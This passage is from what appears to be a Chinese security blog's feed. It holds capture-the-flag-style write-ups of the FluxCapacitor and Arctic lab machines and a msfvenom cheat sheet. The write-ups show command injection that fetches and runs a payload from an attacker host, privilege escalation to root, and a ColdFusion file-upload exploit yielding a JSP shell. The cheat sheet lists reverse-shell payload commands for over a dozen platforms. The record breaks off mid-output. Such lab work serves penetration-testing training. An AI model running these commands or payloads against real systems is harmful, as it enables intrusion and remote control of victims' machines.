服务和动态网关。</p><p>CVE-2018-9230：OpenResty中的Uri参数溢出</p><ul><li>可能是版本漏洞</li><li>扫描sync目录，确认了参数opt，可以执行某些命令</li></ul><h2 id="trying"><a href="#trying" class="headerlink" title="trying"></a>trying</h2><p>searchsploit openResty<br>searchsploit CVE-2018-9230<br>searchsploit SuperWAF<br>无exp</p><hr><p>gobuster扫描存在的目录：</p><figure class="highlight dart"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dart"><span class="hljs-keyword">sync</span><br>synctoy<br></code></pre></div></td></tr></table></figure><hr><p>经过信息搜集，了解到openResty是一个web服务器（比如说nignx,apache），superwaf没有任何资料。</p><p>用curl访问，获取当前时间戳；用浏览器访问，获得403，于是用burp抓包。</p><p>如果将<code>User-Agent:</code>删除，成功获取当前时间戳<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-03/5.PNG" alt="5"></p><h2 id="准备提权"><a href="#准备提权" class="headerlink" title="准备提权"></a>准备提权</h2><p>在linux命令中，反斜杠’&#39; 与其他字符一起，会被解释为特殊含义字符。</p><p>例如\n ，换行符；&#39; ，将单引号转义。</p><p>如果不使用单引号和双引号（如：echo \，输出为空），则反斜杠可以被看做自动忽略。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-03/6.PNG" alt="6"></p><p>利用这个特性，我们可以用反斜杠插入要执行的命令，从而绕过/sync脚本的限制</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-03/7.PNG" alt="7"></p><hr><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://10.10.10.69/sync?opt=&#x27; sudo -l&#x27;&quot;</span><br><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://10.10.10.69/sync?opt=&#x27; c\at /home/themiddle/.monit&#x27;&quot;</span><br><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://10.10.10.69/sync?opt=&#x27; whe\reis n\c&#x27;&quot;</span><br><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://10.10.10.69/sync?opt=&#x27; w\hereis python&#x27;&quot;</span><br><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://10.10.10.69/sync?opt=&#x27; w\hereis wg\et&#x27;&quot;</span><br><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://10.10.10.69/sync?opt=&#x27; /usr/bin/pyt\hon3.6 -V&#x27;&quot;</span><br><br><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://10.10.10.69/sync?opt=&#x27; /usr/bin/wg\et http://10.10.14.7:8888/p.elf -P /tmp&#x27;&quot;</span>   发现p.elf不能保存到/tmp，于是将payload改名为index.html.<span class="hljs-number">1</span><br><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://10.10.10.69/sync?opt=&#x27; ch\mod a+x /tmp/index.html.1&#x27;&quot;</span><br><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://10.10.10.69/sync?opt=&#x27; ./tmp/index.html.1&#x27;&quot;</span><br></code></pre></div></td></tr></table></figure><h4 id="info"><a href="#info" class="headerlink" title="info"></a>info</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">os: Linux fluxcapacitor <span class="hljs-number">4.13</span>.<span class="hljs-number">0</span>-<span class="hljs-number">17</span>-generic <span class="hljs-comment">#20-Ubuntu SMP Mon Nov 6 10:04:08 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br><br><span class="hljs-regexp">/bin/</span>nc , <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3.6 , /u</span>sr<span class="hljs-regexp">/bin/</span>wget<br></code></pre></div></td></tr></table></figure><h4 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h4><p>/home/themiddle/.monit</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> == <span class="hljs-string">&quot;cmd&quot;</span> ]; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Trying to execute <span class="hljs-variable">$&#123;2&#125;</span>&quot;</span><br>CMD=$(<span class="hljs-built_in">echo</span> -n <span class="hljs-variable">$&#123;2&#125;</span> | base64 -d)<br>bash -c <span class="hljs-string">&quot;<span class="hljs-variable">$CMD</span>&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></div></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>参考以前<a href="https://whale3070.github.io/training/2018/11/10/x/">文章</a><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-03/8.PNG" alt="8"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">/usr/bin/python3.6</span> -c &#x27;import pty; pty.spawn<span class="hljs-params">(&quot;/bin/bash&quot;)</span>&#x27;<br><br><span class="hljs-keyword">cd</span> <span class="hljs-string">/home/themiddle/</span><br><span class="hljs-string">./.monit</span> cmd bHMK<br>sudo <span class="hljs-string">./.monit</span> cmd Y2F0IC9yb290L3Jvb3QudHh0Cg==（cat <span class="hljs-string">/root/root.txt</span>）<br><br>通过sudo <span class="hljs-string">./.monit</span> cmd 任意命令<br><br>这种方式，可以以root权限执行任意命令<br></code></pre></div></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>wfuzz报错了，在这个实验中，fuzz到/sync?opt=，是获得突破点的关键。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>linux os</tag>
      
      <tag>command execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msfvenom-生成攻击载荷-命令速查</title>
    <link href="/2019/03/01/x/"/>
    <url>/2019/03/01/x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：</p><ul><li>github-Micro8</li><li><a href="https://github.com/rapid7/metasploit-framework/wiki/Metasploit-5.0-Release-Notes">https://github.com/rapid7/metasploit-framework/wiki/Metasploit-5.0-Release-Notes</a></li><li><a href="https://www.hackers-arise.com/single-post/2017/06/08/Metasploit-Basics-Part-7-Adding-a-New-Module-EternalBlue">https://www.hackers-arise.com/single-post/2017/06/08/Metasploit-Basics-Part-7-Adding-a-New-Module-EternalBlue</a></li></ul><p>msfvenom -l payload 列出所有可用载荷</p><p>截至2019.3.4日，msf的版本为：metasploit v5.0.9-dev</p><table><thead><tr><th>命令</th><th>之前</th><th>现在</th></tr></thead><tbody><tr><td>更新</td><td>msfupdate</td><td>apt update; apt install metasploit-framework</td></tr><tr><td>handler监听</td><td>命令1</td><td>handler -H 10.10.14.7 -P 6678 -p linux/x86/meterpreter/reverse_tcp</td></tr><tr><td>添加exploit</td><td>命令2</td><td>命令3</td></tr></tbody></table><p>命令1：<br>msfconsole -r job.rc</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/multi/handler<br><span class="hljs-builtin-name">set</span> payload linux/x86/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> LHOST 10.10.14.7<br><span class="hljs-builtin-name">set</span> LPORT 7766<br>run<br></code></pre></div></td></tr></table></figure><p>命令2：<code>新建/root/.msf4/modules/exploits/new/xx.rb</code></p><p>命令3: <code>新建usr/share/metasploit-framework/modules/exploits/unix/webapp/xx.rb</code></p><blockquote><p>reload_all<br>当载入新的metasploit 插件/payload，不用重启metasploit。</p></blockquote><h2 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">handler -H<span class="hljs-built_in"> ip </span>-P 4444 -p windows/meterpreter/reverse_tcp<br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=4444 -f exe -o payload.exe<br></code></pre></div></td></tr></table></figure><h2 id="mac"><a href="#mac" class="headerlink" title="mac:"></a>mac:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP<br><span class="hljs-attribute">LPORT</span>=攻击机端口 -f macho -o payload.macho<br></code></pre></div></td></tr></table></figure><h2 id="android"><a href="#android" class="headerlink" title="android:"></a>android:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻<br>击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f apk -o payload.apk<br></code></pre></div></td></tr></table></figure><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell:"></a>powershell:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=<br>攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -e cmd/powershell_base64 -i 3 -f<span class="hljs-built_in"> raw </span>-o payload.ps1<br></code></pre></div></td></tr></table></figure><h2 id="linux"><a href="#linux" class="headerlink" title="linux:"></a>linux:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p linux/x86/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f elf -o payload.elf<br></code></pre></div></td></tr></table></figure><h2 id="php"><a href="#php" class="headerlink" title="php:"></a>php:</h2><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">msfvenom -<span class="hljs-keyword">p</span> php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=<br>&lt;Your Port <span class="hljs-keyword">to</span> Connect On&gt; -<span class="hljs-keyword">f</span> raw &gt; <span class="hljs-keyword">shell</span>.php<br><span class="hljs-keyword">cat</span> <span class="hljs-keyword">shell</span>.php | pbcopy &amp;&amp; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | <span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; <span class="hljs-keyword">shell</span>.php &amp;&amp; pbpaste &gt;&gt;<br><span class="hljs-keyword">shell</span>.php<br></code></pre></div></td></tr></table></figure><h2 id="aspx"><a href="#aspx" class="headerlink" title="aspx:"></a>aspx:</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<br>攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx<br></code></pre></div></td></tr></table></figure><h2 id="jsp"><a href="#jsp" class="headerlink" title="jsp:"></a>jsp:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom --platform java -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻<br>击机端口 -f<span class="hljs-built_in"> raw </span>-o payload.jsp<br></code></pre></div></td></tr></table></figure><h2 id="war"><a href="#war" class="headerlink" title="war:"></a>war:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-<br>o payload.war<br></code></pre></div></td></tr></table></figure><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs:"></a>nodejs:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p nodejs/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o<br>payload.js<br></code></pre></div></td></tr></table></figure><h2 id="python"><a href="#python" class="headerlink" title="python:"></a>python:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p python/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -<br>f<span class="hljs-built_in"> raw </span>-o payload.py<br></code></pre></div></td></tr></table></figure><h2 id="perl"><a href="#perl" class="headerlink" title="perl:"></a>perl:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o<br>payload.pl<br></code></pre></div></td></tr></table></figure><h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby:"></a>ruby:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p ruby/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o<br>payload.rb<br></code></pre></div></td></tr></table></figure><h2 id="lua"><a href="#lua" class="headerlink" title="lua:"></a>lua:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_lua <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o<br>payload.lua<br></code></pre></div></td></tr></table></figure><h2 id="windows-shellcode"><a href="#windows-shellcode" class="headerlink" title="windows shellcode:"></a>windows shellcode:</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">msfvenom -a x86 --platform Windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<br>攻击机IP LPORT=攻击机端口 -f c<br></code></pre></div></td></tr></table></figure><h2 id="linux-shellcode"><a href="#linux-shellcode" class="headerlink" title="linux shellcode:"></a>linux shellcode:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻<br>击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f c<br></code></pre></div></td></tr></table></figure><h2 id="mac-shellcode"><a href="#mac-shellcode" class="headerlink" title="mac shellcode:"></a>mac shellcode:</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP<br><span class="hljs-attribute">LPORT</span>=攻击机端口 -f c<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Arctic（ColdFusion任意文件上传）</title>
    <link href="/2019/02/26/x/"/>
    <url>/2019/02/26/x/</url>
    
    <content type="html"><![CDATA[<h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><figure class="highlight vhdl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vhdl">Discovered <span class="hljs-keyword">open</span> <span class="hljs-keyword">port</span> <span class="hljs-number">8500</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.11</span>                                   <br>Discovered <span class="hljs-keyword">open</span> <span class="hljs-keyword">port</span> <span class="hljs-number">135</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.11</span>                                    <br>Discovered <span class="hljs-keyword">open</span> <span class="hljs-keyword">port</span> <span class="hljs-number">49154</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.11</span><br><br><span class="hljs-number">135</span>/tcp   <span class="hljs-keyword">open</span>  msrpc   Microsoft Windows RPC<br><span class="hljs-number">8500</span>/tcp  <span class="hljs-keyword">open</span>  fmtp?<br><span class="hljs-number">49154</span>/tcp <span class="hljs-keyword">open</span>  msrpc   Microsoft Windows RPC<br>os : Microsoft Windows Vista           <br></code></pre></div></td></tr></table></figure><h2 id="尝试1-rpc漏洞检查"><a href="#尝试1-rpc漏洞检查" class="headerlink" title="尝试1: rpc漏洞检查"></a>尝试1: rpc漏洞检查</h2><p>google搜索。。。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> ms<span class="hljs-number">03</span>-<span class="hljs-number">026</span><br><span class="hljs-attribute">use</span> exploit/windows/dcerpc/ms<span class="hljs-number">03</span>_<span class="hljs-number">026</span>_dcom<br><span class="hljs-attribute">show</span> options<br></code></pre></div></td></tr></table></figure><h2 id="检查8500端口"><a href="#检查8500端口" class="headerlink" title="检查8500端口"></a>检查8500端口</h2><figure class="highlight mercury"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mercury">telnet <span class="hljs-number">10.10</span>.<span class="hljs-number">10.11</span> <span class="hljs-number">8500</span><br><br>Trying <span class="hljs-number">10.10</span>.<span class="hljs-number">10.11</span>...<br><br>Connected to <span class="hljs-number">10.10</span>.<span class="hljs-number">10.11</span>.<br><br>Escape character <span class="hljs-keyword">is</span> <span class="hljs-string">&#x27;^]&#x27;</span>.<br><br>Connection closed by foreign host.<br></code></pre></div></td></tr></table></figure><p>fmtp: <strong>flight-message-transfer-protocol</strong>，网上查了一下，没有见过这个协议，也不知道具体是干什么的。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26/2.PNG" alt="2"><br>没有任何操作思路。</p><p>根据wp学习一下。<br>ColdFusion应用程序由一组后缀名为CFM的文本文件构成，这些文件实现了该应用程序的功能…</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> coldfusion<br><span class="hljs-attribute">ColdFusion</span> <span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> - Arbitrary File Upload / Execution (Metasploit) <br><br><span class="hljs-attribute">msfconsole</span><br><span class="hljs-attribute">search</span> ColdFusion<br><span class="hljs-attribute">use</span> exploit/windows/http/coldfusion_fckeditor<br></code></pre></div></td></tr></table></figure><p>burp设置代理，将访问127.0.0.1:8500的地址，发往10.10.10.11:8500。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26/3.PNG" alt="3"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26/4.PNG" alt="4"><br>将msf的payload，用burp repeater截包。</p><figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOST <span class="hljs-comment">127.0.0.1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">RPORT 8500</span><br>run<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26/5.PNG" alt="5"><br>观察右下角，响应用了17秒</p><h2 id="获得一个shell"><a href="#获得一个shell" class="headerlink" title="获得一个shell"></a>获得一个shell</h2><p>浏览器访问地址：<code>http://localhost:8500/userfiles/file/ECZLO.jsp</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26/6.PNG" alt="6"> 获得了一个shell。</p><p>info enum:</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">》whoami</span><br><span class="hljs-string">arctic\tolis</span><br><span class="hljs-string">》systeminfo</span><br><span class="hljs-attr">Host Name:</span>                 <span class="hljs-string">ARCTIC</span><br><span class="hljs-attr">OS Name:</span>                   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2008 </span><span class="hljs-string">R2</span> <span class="hljs-string">Standard</span> <br><span class="hljs-attr">OS Version:</span>                <span class="hljs-number">6.1</span><span class="hljs-number">.7600</span> <span class="hljs-string">N/A</span> <span class="hljs-string">Build</span> <span class="hljs-number">7600</span><br><span class="hljs-attr">OS Manufacturer:</span>           <span class="hljs-string">Microsoft</span> <span class="hljs-string">Corporation</span><br><span class="hljs-attr">OS Configuration:</span>          <span class="hljs-string">Standalone</span> <span class="hljs-string">Server</span><br><span class="hljs-attr">OS Build Type:</span>             <span class="hljs-string">Multiprocessor</span> <span class="hljs-string">Free</span><br><span class="hljs-attr">Registered Owner:</span>          <span class="hljs-string">Windows</span> <span class="hljs-string">User</span><br><span class="hljs-attr">Registered Organization:</span>   <br><span class="hljs-attr">Product ID:</span>                <span class="hljs-number">55041</span><span class="hljs-number">-507</span><span class="hljs-number">-9857321</span><span class="hljs-number">-84451</span><br><span class="hljs-attr">Original Install Date:</span>     <span class="hljs-number">22</span><span class="hljs-string">/3/2017,</span> <span class="hljs-number">11</span><span class="hljs-string">:09:45</span> <span class="hljs-string">��</span><br><span class="hljs-attr">System Boot Time:</span>          <span class="hljs-number">31</span><span class="hljs-string">/1/2019,</span> <span class="hljs-number">7</span><span class="hljs-string">:52:38</span> <span class="hljs-string">��</span><br><span class="hljs-attr">System Manufacturer:</span>       <span class="hljs-string">VMware,</span> <span class="hljs-string">Inc.</span><br><span class="hljs-attr">System Model:</span>              <span class="hljs-string">VMware</span> <span class="hljs-string">Virtual</span> <span class="hljs-string">Platform</span><br><span class="hljs-attr">System Type:</span>               <span class="hljs-string">x64-based</span> <span class="hljs-string">PC</span><br><span class="hljs-string">Processor(s):</span>              <span class="hljs-number">2</span> <span class="hljs-string">Processor(s)</span> <span class="hljs-string">Installed.</span><br>                           [<span class="hljs-number">01</span>]<span class="hljs-string">:</span> <span class="hljs-string">Intel64</span> <span class="hljs-string">Family</span> <span class="hljs-number">6</span> <span class="hljs-string">Model</span> <span class="hljs-number">79</span> <span class="hljs-string">Stepping</span> <span class="hljs-number">1</span> <span class="hljs-string">GenuineIntel</span> <span class="hljs-string">~2400</span> <span class="hljs-string">Mhz</span><br>                           [<span class="hljs-number">02</span>]<span class="hljs-string">:</span> <span class="hljs-string">Intel64</span> <span class="hljs-string">Family</span> <span class="hljs-number">6</span> <span class="hljs-string">Model</span> <span class="hljs-number">79</span> <span class="hljs-string">Stepping</span> <span class="hljs-number">1</span> <span class="hljs-string">GenuineIntel</span> <span class="hljs-string">~2400</span> <span class="hljs-string">Mhz</span><br><span class="hljs-attr">BIOS Version:</span>              <span class="hljs-string">Phoenix</span> <span class="hljs-string">Technologies</span> <span class="hljs-string">LTD</span> <span class="hljs-number">6.00</span><span class="hljs-string">,</span> <span class="hljs-number">5</span><span class="hljs-string">/4/2016</span><br><span class="hljs-attr">Windows Directory:</span>         <span class="hljs-string">C:\Windows</span><br><span class="hljs-attr">System Directory:</span>          <span class="hljs-string">C:\Windows\system32</span><br><span class="hljs-attr">Boot Device:</span>               <span class="hljs-string">\Device\HarddiskVolume1</span><br><span class="hljs-attr">System Locale:</span>             <span class="hljs-string">el;Greek</span><br><span class="hljs-attr">Input Locale:</span>              <span class="hljs-string">en-us;English</span> <span class="hljs-string">(United</span> <span class="hljs-string">States)</span><br><span class="hljs-attr">Time Zone:</span>                 <span class="hljs-string">(UTC+02:00)</span> <span class="hljs-string">Athens,</span> <span class="hljs-string">Bucharest,</span> <span class="hljs-string">Istanbul</span><br><span class="hljs-attr">Total Physical Memory:</span>     <span class="hljs-number">1.024</span> <span class="hljs-string">MB</span><br><span class="hljs-attr">Available Physical Memory:</span> <span class="hljs-number">241</span> <span 